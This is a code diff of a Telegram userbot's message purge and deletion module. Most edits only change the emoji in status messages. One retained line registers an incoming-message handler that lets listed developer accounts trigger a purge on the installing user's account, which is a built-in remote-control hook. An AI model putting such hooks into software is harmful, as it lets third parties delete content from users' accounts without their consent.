@@ -13,7 +13,7 @@ from userbot.events import register
 
 
 @register(outgoing=True, pattern=r"^\.purge$")
-@register(incoming=True, from_users=1663258664, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
@@ -29,7 +29,7 @@ async def fastpurger(purg):
                 await purg.client.delete_messages(chat, msgs)
                 msgs = []
     else:
-        return await purg.edit("`Mohon Balas Ke Pesan ✨ `")
+        return await purg.edit("`Mohon Balas Ke Pesan ⭐ `")
 
     if msgs:
         await purg.client.delete_messages(chat, msgs)
@@ -84,7 +84,7 @@ async def delete_it(delme):
             """
             if BOTLOG:
                 await delme.client.send_message(
-                    BOTLOG_CHATID, "`Berhasil Menghapus Pesan ✨`")
+                    BOTLOG_CHATID, "`Berhasil Menghapus Pesan ⭐`")
             """
         except rpcbaseerrors.BadRequestError:
             await delme.edit("`Tidak Bisa Menghapus Pesan`")
@@ -127,7 +127,7 @@ async def selfdestruct(destroy):
     """
     if BOTLOG:
         await destroy.client.send_message(BOTLOG_CHATID,
-                                          "`✨ SD Berhasil Dilakukan ✨`")
+                                          "`⭐ SD Berhasil Dilakukan ⭐`")
     """
 
 
